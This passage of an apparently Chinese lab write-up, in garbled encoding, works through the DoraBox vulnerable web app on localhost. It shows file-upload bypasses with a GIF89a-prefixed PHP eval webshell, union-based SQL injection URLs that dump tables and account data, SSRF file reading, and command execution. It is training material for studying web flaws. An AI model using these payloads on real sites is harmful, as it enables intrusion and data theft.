class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-5\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>æ‰“å¼€ç½‘ç»œæŠ“åŒ…ï¼ŒæŠŠåç¼€ä¿®æ”¹ä¸º.php<img src=\"dorabox_fp_mime002.png\" alt=\"\"></li>\n<li>ä¸Šä¼ æˆåŠŸï¼Œèœåˆ€ç›´è¿<img src=\"dorabox_fp_mime003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-5\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-5\">#</a> æ€»ç»“ï¼š</h2>\n<p><strong>MIME ä»‹ç»ï¼š</strong></p>\n<blockquote>\n<p>MIMEï¼ˆMultipurpose Internet Mail Extensionsï¼‰å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åæ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šçš„åº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚ï¼ˆæ¥è‡ªç™¾åº¦ç™¾ç§‘ï¼‰</p>\n</blockquote>\n<p><strong>å¸¸è§çš„ç±»å‹ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th>æ–‡ä»¶ç±»å‹</th>\n<th>åç¼€</th>\n<th>æ•°æ®åŒ…ä¸­çš„æ–‡ä»¶ç±»å‹</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬</td>\n<td>.html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>xml æ–‡æ¡£</td>\n<td>.xml</td>\n<td>text/xml</td>\n</tr>\n<tr>\n<td>xhtml æ–‡æ¡£</td>\n<td>.xhtml</td>\n<td>application/xhtml+xml</td>\n</tr>\n<tr>\n<td>æ™®é€šæ–‡æœ¬æ–‡æ¡£</td>\n<td>.text</td>\n<td>text/plain</td>\n</tr>\n<tr>\n<td>RTF æ–‡æœ¬</td>\n<td>.rtf</td>\n<td>application/rtf</td>\n</tr>\n<tr>\n<td>PDF æ–‡æ¡£</td>\n<td>.pdf</td>\n<td>application/pdf</td>\n</tr>\n<tr>\n<td>Miscrosoft Word æ–‡ä»¶</td>\n<td>.word</td>\n<td>application/msword</td>\n</tr>\n<tr>\n<td>PNG å›¾åƒ</td>\n<td>.png</td>\n<td>image/png</td>\n</tr>\n<tr>\n<td>GIF å›¾å½¢</td>\n<td>.gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPEG å›¾å½¢</td>\n<td>.jpeg,.jpg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>au å£°éŸ³æ–‡ä»¶</td>\n<td>.au</td>\n<td>audio/basic</td>\n</tr>\n<tr>\n<td>MIDI éŸ³ä¹æ–‡ä»¶</td>\n<td>mid,.midi</td>\n<td>audio/midi,audio/x-midi</td>\n</tr>\n<tr>\n<td>RealAudio éŸ³ä¹</td>\n<td>.ra,.ram</td>\n<td>audio/x-pn-realaudio</td>\n</tr>\n<tr>\n<td>AVI æ–‡ä»¶</td>\n<td>.avi</td>\n<td>video/x-msvideo</td>\n</tr>\n<tr>\n<td>GZIP æ–‡ä»¶</td>\n<td>.gz</td>\n<td>application/x-gzip</td>\n</tr>\n<tr>\n<td>TAR æ–‡ä»¶</td>\n<td>.tar</td>\n<td>application/x-tar</td>\n</tr>\n<tr>\n<td>ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®</td>\n<td></td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<p><strong>å‡ºç°åœ¨ HTTP æ•°æ®åŒ…ä¸­å¯èƒ½æœ‰çš„ä½ç½®ï¼ˆä¸æ˜¯å¾ˆæœ‰ç”»é¢æ„Ÿâ€¦ï¼‰ï¼š</strong></p>\n<blockquote>\n<p><strong>MIME ä¿¡æ¯å¤´æœ‰ï¼š</strong></p>\n<p>MIME-Version:</p>\n<p>è¿™ä¸ªå¤´æä¾›äº†æ‰€ç”¨ MIME çš„ç‰ˆæœ¬å·ã€‚è¿™ä¸ªå€¼ä¹ æƒ¯ä¸Šä¸º 1.0ã€‚</p>\n<p><strong>Content-Type:</strong></p>\n<p>å®ƒå®šä¹‰äº†æ•°æ®çš„ç±»å‹ï¼Œä»¥ä¾¿æ•°æ®èƒ½è¢«é€‚å½“çš„å¤„ç†ã€‚æœ‰æ•ˆçš„ç±»å‹æœ‰ï¼štextï¼Œimageï¼Œaudioï¼Œvideoï¼Œapplicationsï¼Œmultipart å’Œ messageã€‚æ³¨æ„ä»»ä½•ä¸€ä¸ªäºŒè¿›åˆ¶é™„ä»¶éƒ½åº”è¯¥è¢«å«åš application/octet- streamã€‚è¿™ä¸ªå¤´çš„ä¸€äº›ç”¨ä¾‹ä¸ºï¼šimage/jpg, application/msworkï¼Œmultipart/mixedï¼Œè¿™åªæ˜¯å¾ˆå°‘çš„ä¸€éƒ¨åˆ†ã€‚</p>\n<p><strong>Content-Transfer-Encoding:</strong></p>\n<p>è¿™æ˜¯æ‰€æœ‰å¤´ä¸­æœ€é‡è¦çš„ä¸€ä¸ªï¼Œå› ä¸ºå®ƒè¯´æ˜äº†å¯¹æ•°æ®æ‰€æ‰§è¡Œçš„ç¼–ç æ–¹å¼ï¼Œå®¢æˆ· / MUA å°†ç”¨å®ƒå¯¹é™„ä»¶è¿›è¡Œè§£ç ã€‚å¯¹äºæ¯ä¸ªé™„ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ 7bitï¼Œ8bitï¼Œbinary ï¼Œquoted-printableï¼Œ<a href=\"https://baike.baidu.com/item/base64\">base64</a> å’Œ custom ä¸­çš„ä¸€ç§ç¼–ç æ–¹å¼ã€‚7bit ç¼–ç æ˜¯ç”¨åœ¨ US ASCII<a href=\"https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86\"> å­—ç¬¦é›†</a>ä¸Šçš„å¸¸ç”¨çš„ä¸€ç§ç¼–ç æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯ï¼Œä¿æŒå®ƒçš„åŸæ ·ã€‚8bit å’Œ binary ç¼–ç ä¸€èˆ¬ä¸ç”¨ã€‚å¯¹äººç±»å¯è¯»çš„æ ‡å‡†æ–‡æœ¬ï¼Œå¦‚æœä¼ è¾“è¦ç»è¿‡å¯¹æ ¼å¼æœ‰å½±å“çš„<a href=\"https://baike.baidu.com/item/%E7%BD%91%E5%85%B3\">ç½‘å…³</a>æ—¶å¯¹å…¶è¿›è¡Œä¿æŠ¤ï¼Œå¯ä»¥ä½¿ç”¨ quoted printable ã€‚Base64 æ˜¯ä¸€ç§é€šç”¨æ–¹æ³•ï¼Œåœ¨éœ€è¦å†³å®šä½¿ç”¨å“ªä¸€ç§ç¼–ç æ–¹æ³•æ—¶ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªä¸ç”¨è´¹è„‘å­çš„é€‰æ‹©ï¼›å®ƒé€šå¸¸ç”¨åœ¨äºŒè¿›åˆ¶ï¼Œéæ–‡æœ¬æ•°æ®ä¸Šã€‚æ³¨æ„ï¼Œä»»ä½•é 7bit æ•°æ®å¿…é¡»ç”¨ä¸€ç§æ¨¡å¼ç¼–ç ï¼Œè¿™æ ·å®ƒå°±å¯ä»¥é€šè¿‡ Internet<a href=\"https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6%E7%BD%91%E5%85%B3\"> é‚®ä»¶ç½‘å…³</a>ï¼</p>\n<p><strong>Content-ID:</strong></p>\n<p>å¦‚æœ Content-Type æ˜¯ message/external-body æˆ– multipart/alternative æ—¶ï¼Œè¿™ä¸ªå¤´å°±æœ‰ç”¨äº†ï¼Œå®ƒè¶…å‡ºäº†æœ¬æ–‡çš„èŒƒå›´ã€‚</p>\n<h3 id=\"content-description\"><a class=\"markdownIt-Anchor\" href=\"#content-description\">#</a> Content-Description:</h3>\n<p>è¿™æ˜¯ä¸€ä¸ªå¯é€‰çš„å¤´ã€‚å®ƒæ˜¯ä»»ä½•ä¿¡æ¯æ®µå†…å®¹çš„è‡ªç”±æ–‡æœ¬æè¿°ã€‚æè¿°å¿…é¡»ä½¿ç”¨ us-ascii ç ã€‚</p>\n<p><strong>Content-Disposition:</strong></p>\n<p>ä¸€ä¸ªè¯•éªŒæ€§çš„å¤´ï¼Œå®ƒç”¨äºç»™å®¢æˆ·ç¨‹åº / MUA æä¾›æç¤ºï¼Œæ¥å†³å®šæ˜¯å¦åœ¨è¡Œå†…æ˜¾ç¤ºé™„ä»¶æˆ–ä½œä¸ºå•ç‹¬çš„é™„ä»¶ã€‚</p>\n<p>MIME æ®µå¤´ï¼ˆå‡ºç°åœ¨å®é™…çš„ MIME é™„ä»¶éƒ¨åˆ†çš„å¤´ï¼‰ï¼Œé™¤äº† MIME-Version å¤´ï¼Œå¯ä»¥æ‹¥æœ‰ä»¥ä¸Šä»»ä½•å¤´å­—æ®µã€‚å¦‚æœä¸€ä¸ª MIME å¤´æ˜¯ä¿¡æ¯å—çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå°†ä½œç”¨äºæ•´ä¸ªä¿¡æ¯ä½“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ Content-Transfer-Encoding æ˜¾ç¤ºåœ¨ä¿¡æ¯ï¼ˆæŒ‡æ•´ä¸ªä¿¡æ¯ï¼‰å¤´ä¸­ï¼Œå®ƒåº”ç”¨äºæ•´ä¸ªä¿¡æ¯ä½“ï¼Œä½†æ˜¯å¦‚æœå®ƒæ˜¾ç¤ºåœ¨ä¸€ä¸ª MIME æ®µé‡Œï¼Œå®ƒ &quot;åªèƒ½&quot; ç”¨äºé‚£ä¸ªæ®µä¸­ã€‚</p>\n<p>æ³¨æ„ï¼šå…¶å¯ä»¥å¯¹è‡ªåŠ¨å¯¹æ”¶åˆ°çš„<a href=\"https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6\">é‚®ä»¶</a>è¿›è¡Œè§£å¯†ã€‚</p>\n</blockquote>\n<p>[ä»¥ä¸Šæ‹“å±•æ¥è‡ªè¿™é‡Œ</p>\n<h1 id=\"æ‹“å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ \"><a class=\"markdownIt-Anchor\" href=\"#æ‹“å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ \">#</a> æ‹“å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ </h1>\n<p>åå°è¿›è¡Œäº†æ–‡ä»¶ååç¼€è¿‡æ»¤ï¼Œæ— æ³•ä¸Šä¼ .php æ–‡ä»¶</p>\n<h2 id=\"è¿‡ç¨‹-6\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-6\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>å°è¯•å¤§å°å†™ç»•è¿‡ï¼ŒæŠŠæ–‡ä»¶ååç¼€æ”¹ä¸º.phPï¼Œä¸Šä¼ æˆåŠŸï¼Œèœåˆ€ç›´è¿<img src=\"dorabox_fp_hz001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-6\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-6\">#</a> æ€»ç»“ï¼š</h2>\n<p>å› ä¸ºå†™è¿‡ upload_labs (æ²¡å†™å®Œ)ï¼Œå°±æœ‰æ€è·¯</p>\n<h1 id=\"å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ \"><a class=\"markdownIt-Anchor\" href=\"#å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ \">#</a> å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ </h1>\n<p>å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œåˆ¤è¯»è¿‡æ»¤</p>\n<h2 id=\"è¿‡ç¨‹-7\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-7\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>\n<p>åœ¨æœ¨é©¬æ–‡ä»¶æœ€å‰é¢åŠ ä¸Š GIF89a:</p>\n<p><code>GIF89a &lt;?php @eval($_POST['attack']) ?&gt;</code></p>\n</li>\n<li>\n<p>ä¸Šä¼ æˆåŠŸï¼Œè·¯å¾„å‘Šè¯‰äº†ï¼Œèœåˆ€ç›´è¿</p>\n</li>\n</ol>\n<p><img src=\"dorabox_fp_nr001.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-7\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-7\">#</a> æ€»ç»“ï¼š</h2>\n<p>GIF89a æ˜¯æ–‡ä»¶å¤´æ ¡éªŒå†…å®¹ï¼ŒæœåŠ¡å™¨çœ‹åˆ°è¿™é‡Œå°±ä¼šä»¥ä¸ºæ˜¯ GIF æ–‡ä»¶ã€‚</p>\n<p>å¸¸è§çš„æ–‡ä»¶å¤´å¯¹åº”å…³ç³»ï¼ˆå…¥èŒåŸ¹è®­ä¸Šçš„ï¼Œè¿™ä¸ªæˆ‘ä»¥å‰è¿˜æ‰¾è¿‡ï¼Œå°±æ˜¯å› ä¸ºèœï¼Œæ²¡æœ‰æ‰¾åˆ°ï¼‰ï¼š</p>\n<ol>\n<li>JPEG;.JPE;.JPGï¼Œâ€JPGGraphic Fileâ€</li>\n<li>gifï¼Œâ€GIF 89Aâ€</li>\n<li>zipï¼Œâ€Zip Compressedâ€</li>\n<li>doc;.xls;.xlt;.ppt;.aprï¼Œâ€MS Compound Document v1 or Lotus Approach APRfileâ€</li>\n</ol>\n<h1 id=\"sqliæ•°å­—æ‰‹å·¥æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#sqliæ•°å­—æ‰‹å·¥æ³¨å…¥\">#</a> SQLi æ•°å­—æ‰‹å·¥æ³¨å…¥</h1>\n<p><img src=\"dorabox_sqlnum001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-8\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-8\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>\n<p>è¾“å‡ºæŠ¥é”™ï¼š</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=1\">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> order by 4 &amp;submit=submit<img src=\"dorabox_sqlnum007.png\" alt=\"\"> æ­£å¸¸è¾“å‡ºï¼š</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 order by 3 &amp;submit=submit</p>\n<p>ä»¥ä¸Šè¯´æ˜ï¼Œåº”è¾“å‡º 3 ä¸ªå­—æ®µ</p>\n</li>\n<li>\n<p>ç”¨ count (*) ç»Ÿè®¡è¡¨å†…æ•°æ®ï¼Œåªæœ‰ä¸¤æ¡æ•°æ®ï¼š</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=3\">http://localhost/dorabox/sql_injection/sql_num.php?id=3</a> union select 10086,count(*),10087 from news order by 1 desc limit 1<br>\n&amp;submit=submit</p>\n<p><img src=\"dorabox_sqlnum002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>çˆ†æ•°æ®åº“</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 union select 3,database(),user() order by 1 desc limit 1<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum003.png\" alt=\"\"></p>\n</li>\n<li>\n<p>çˆ†è¡¨åï¼Œåˆ©ç”¨ group_concat ()ï¼š</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=1\">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> union select 3,group_concat(table_name),0 from information_schema.tables where table_schema = database() order by 1 desc<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>çˆ†å­—æ®µï¼š</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 union select 3,group_concat(column_name),0 from information_schema.columns where table_name = â€˜accountâ€™ order by 1 desc<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum005.png\" alt=\"\"></p>\n</li>\n<li>\n<p>çˆ†å†…å®¹ï¼š</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id = 1 union select 3,concat_ws(&quot;,&quot;,id,rest,own),0 from account where 1=1 order by 1 desc<img src=\"dorabox_sqlnum006.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"æ€»ç»“-8\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-8\">#</a> æ€»ç»“ï¼š</h2>\n<ul>\n<li>\n<p>mysql å­—ç¬¦æ‹¼æ¥æ–¹æ³•</p>\n<ol>\n<li>\n<p>concat()</p>\n<p>åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</p>\n<p>è¯­æ³•ï¼šconcat (str1, str2, â€¦)</p>\n<p>è¯´æ˜ï¼šè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸º nullï¼Œåˆ™è¿”å›å€¼ä¸º nullã€‚</p>\n</li>\n<li>\n<p>concat_ws()</p>\n<p>åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»¥è‡ªå®šä¹‰çš„ç¬¦å·è¿›è¡Œåˆ†å‰²</p>\n<p>è¯­æ³•ï¼šconcat (separator, str1, str2, â€¦)</p>\n<p>è¯´æ˜ï¼šç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ†éš”ç¬¦ï¼Œè‹¥ä¸º null, è¿”å›ç»“æœä¹Ÿä¼šä¸º null</p>\n</li>\n<li>\n<p>group_concat()</p>\n<p>åŠŸèƒ½ï¼šå°† group by äº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœ</p>\n<p>è¯­æ³•ï¼šgroup_concat ([distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc/desc] [separator â€˜åˆ†éš”ç¬¦â€™] )</p>\n<p>è¯´æ˜ï¼šé€šè¿‡ä½¿ç”¨ distinct å¯ä»¥æ’é™¤é‡å¤å€¼ï¼›å¦‚æœå¸Œæœ›å¯¹ç»“æœä¸­çš„å€¼è¿›è¡Œæ’åºï¼Œå¯ä»¥ä½¿ç”¨ order by å¥å­ï¼›separator æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç¼ºçœä¸ºä¸€ä¸ªé€—å·</p>\n</li>\n</ol>\n</li>\n<li>\n<p>information_schema</p>\n<p>information_schema æ•°æ®åº“æ˜¯ MySQL è‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚å…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚æœ‰äº›æ—¶å€™ç”¨äºè¡¨è¿°è¯¥ä¿¡æ¯çš„å…¶ä»–æœ¯è¯­åŒ…æ‹¬ â€œæ•°æ®è¯å…¸â€ å’Œ â€œç³»ç»Ÿç›®å½•â€ã€‚</p>\n<p>å¸¸ç”¨è¡¨ï¼š</p>\n<ol>\n<li>COLLATION_CHARACTER_SET_APPLICABILITY è¡¨ï¼Œå’Œå­—ç¬¦ç¼–ç ç›¸å…³ï¼ŒåŒ…å«çš„å¸¸ç”¨åˆ—ï¼š\n<ol>\n<li>COLLATION_NAME æ’åºè§„åˆ™æ˜</li>\n<li>CHARACTER_SET_NAME ä¸æ’åºè§„åˆ™å…³è”çš„å­—ç¬¦é›†çš„åç§°</li>\n</ol>\n</li>\n<li>TABLES è¡¨ï¼Œæä¾›åº“ä¸­è¡¨ä¿¡æ¯ï¼ŒåŒ…å«çš„å¸¸ç”¨åˆ—ï¼š\n<ol>\n<li>Table_catalog æ•°æ®è¡¨ç™»è®°ç›®å½•</li>\n<li>Table_schema æ•°æ®è¡¨æ‰€å±çš„æ•°æ®åº“å</li>\n<li>Table_name è¡¨å</li>\n<li>Table_type è¡¨ç±»å‹ [system view | base table]</li>\n<li>Engine ä½¿ç”¨çš„æ•°æ®åº“å¼•æ“ [MyISAM | CSV | InnoDB]</li>\n<li>Version ç‰ˆæœ¬ï¼Œé»˜è®¤å€¼ 10</li>\n<li>Row_format è¡Œæ ¼å¼ [Compact | Dynamic | Fixed]</li>\n<li>Table_rows è¡¨é‡Œæ‰€å­˜å¤šå°‘è¡Œæ•°æ® (æ—©çŸ¥é“æœ‰è¿™ä¸ªï¼Œæˆ‘å°±)</li>\n<li>Avg_row_length å¹³å‡è¡Œé•¿åº¦</li>\n<li>Data_length æ•°æ®é•¿åº¦</li>\n<li>Max_data_length æœ€å¤§æ•°æ®é•¿åº¦</li>\n<li>Index_length ç´¢å¼•é•¿åº¦</li>\n<li>Create_time è¡¨çš„åˆ›å»ºæ—¶é—´</li>\n<li>Update_time è¡¨çš„æ›´æ–°æ—¶é—´</li>\n<li>Check_time è¡¨çš„æ£€æŸ¥æ—¶é—´</li>\n<li>Table_collation è¡¨çš„å­—ç¬¦æ ¡éªŒç¼–ç é›†</li>\n<li>Chechsum æ ¡éªŒå’Œ</li>\n</ol>\n</li>\n<li>COLUMNS è¡¨ï¼Œæä¾›è¡¨ä¸­å­—æ®µä¿¡æ¯ï¼ŒåŒ…å«çš„å¸¸ç”¨åˆ—ï¼š\n<ol>\n<li>TABLE_CATALOG åŒ…å«è¯¥åˆ—çš„è¡¨æ‰€å±çš„ç›®å½•åç§°ã€‚è¯¥å€¼å§‹ç»ˆä¸º defã€‚</li>\n<li>TABLE_SCHEMA å­—æ®µæ‰€åœ¨æ•°æ®åº“çš„åç§°ã€‚</li>\n<li>TABLE_NAME å­—æ®µæ‰€åœ¨è¡¨çš„åç§°ã€‚</li>\n<li></li>\n<li>COLUMN_NAME å­—æ®µçš„åç§°ã€‚</li>\n<li>ORDINAL_POSITION è¡¨ä¸­å­—æ®µçš„ä½ç½®ã€‚ï¼ˆå¯èƒ½ä¼šç”¨ order by ORDINAL_POSITIONï¼‰COLUMN_TYPE å­—æ®µæ•°æ®ç±»å‹ã€‚</li>\n<li>COLUMN_DEFAULT å­—æ®µçš„é»˜è®¤å€¼ã€‚å¦‚æœå­—æ®µå…·æœ‰æ˜¾ç¤ºç¼ºçœå€¼ NULLï¼Œæˆ–è€…å­—æ®µå®šä¹‰ä¸å« DEFAULT å­å¥ï¼Œåˆ™è¯¥å€¼ä¸º NULLã€‚</li>\n<li>COLUMN_TYPE ç±»å‹åç§°ä»¥åŠåˆ«çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç²¾åº¦æˆ–é•¿åº¦ï¼ˆä»¥å­—ç¬¦ä¸ºå•ä½</li>\n<li>CHARACTER_OCTET_LENGTH å¯¹äºå­—ç¬¦ä¸²åˆ—ï¼Œæœ€å¤§é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½</li>\n<li>CHARACTER_MAXIMUM_LENGTH å¯¹äºå­—ç¬¦ä¸²åˆ—ï¼Œæœ€å¤§é•¿åº¦ï¼ˆä»¥å­—ç¬¦ä¸ºå•ä½ï¼‰ COLUMN_KEY åç§°æ˜¯å¦å·²å»ºç«‹ç´¢å¼•</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h1>\n<p><img src=\"dorabox_ssrf001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-9\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-9\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>åˆ©ç”¨ file è¿›è¡Œæ–‡ä»¶è¯»å–<img src=\"dorabox_ssrf002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-9\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-9\">#</a> æ€»ç»“ï¼š</h2>\n<ul>\n<li>å…¶å®å°±æ˜¯æœ‰ url çš„ï¼Œéœ€è¦è®¿é—®åˆ«çš„èµ„æºçš„å°±å¯èƒ½æœ‰ ssrf æ¼æ´ã€‚</li>\n<li>åˆ©ç”¨æ–¹å¼ï¼ˆé‡Œé¢å¥½å¤šæ²¡è¯•è¿‡çš„ï¼Œç­‰æˆ‘å†™å®ŒæŠ¥å‘Šè¦å»ç©ç©ï¼‰\n<ol>\n<li>åˆ©ç”¨ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼ˆç±»ä¼¼æ–‡ä»¶åŒ…å«ï¼Œæƒ³è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œéœ€è¦çŸ¥é“é‡Œé¢æœ‰ä»€ä¹ˆæ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œç„¶åè¿›è¡Œå†…å®¹æå–ï¼‰</li>\n<li>å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„ banner ä¿¡æ¯</li>\n<li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</li>\n<li>å¯¹å†…ç½‘ web åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯</li>\n<li>æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ HTTP GET è¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»</li>\n</ol>\n</li>\n<li>ä¸€äº›çš„ url ä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"ä»»æ„ä»£ç æ‰§è¡Œ\"><a class=\"markdownIt-Anchor\" href=\"#ä»»æ„ä»£ç æ‰§è¡Œ\">#</a> ä»»æ„ä»£ç æ‰§è¡Œ</h1>\n<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå°±æ˜¯éšä¾¿è¾“ä»£ç ï¼Œç„¶åæœåŠ¡å™¨æ‰§è¡Œè„šæœ¬</p>\n<h2 id=\"è¿‡ç¨‹-10\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-10\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>phpinfo ()ï¼ŒæŸ¥çœ‹ php ç‰ˆæœ¬ä¿¡æ¯<img src=\"dorabox_code002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-10\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-10\">#</a> æ€»ç»“ï¼š</h2>\n<p>ä»£ç æ‰§è¡Œæ¼æ´å°±æ˜¯é€šè¿‡æ‰§è¡Œè„šæœ¬ä»£ç ï¼Œè¿›è¡Œæ¸—é€</p>\n<h1 id=\"ä»»æ„å‘½ä»¤æ‰§è¡Œ\"><a class=\"markdownIt-Anchor\" href=\"#ä»»æ„å‘½ä»¤æ‰§è¡Œ\">#</a> ä»»æ„å‘½ä»¤æ‰§è¡Œ</h1>\n<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå°±æ˜¯éšä¾¿è¾“å‘½ä»¤</p>\n<h2 id=\"è¿‡ç¨‹-11\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-11\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>whoamiï¼ŒæŸ¥çœ‹æœåŠ¡å™¨ä¿¡æ¯<img src=\"dorabox_cmd001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-11\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-11\">#</a> æ€»ç»“ï¼š</h2>\n<p>çœ‹æºç æ˜¯åˆ©ç”¨ exec () å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿçš„å‘½ä»¤</p>\n<h1 id=\"åå°„xss\"><a class=\"markdownIt-Anchor\" href=\"#åå°„xss\">#</a> åå°„ XSS</h1>\n<p>è¾“å…¥ 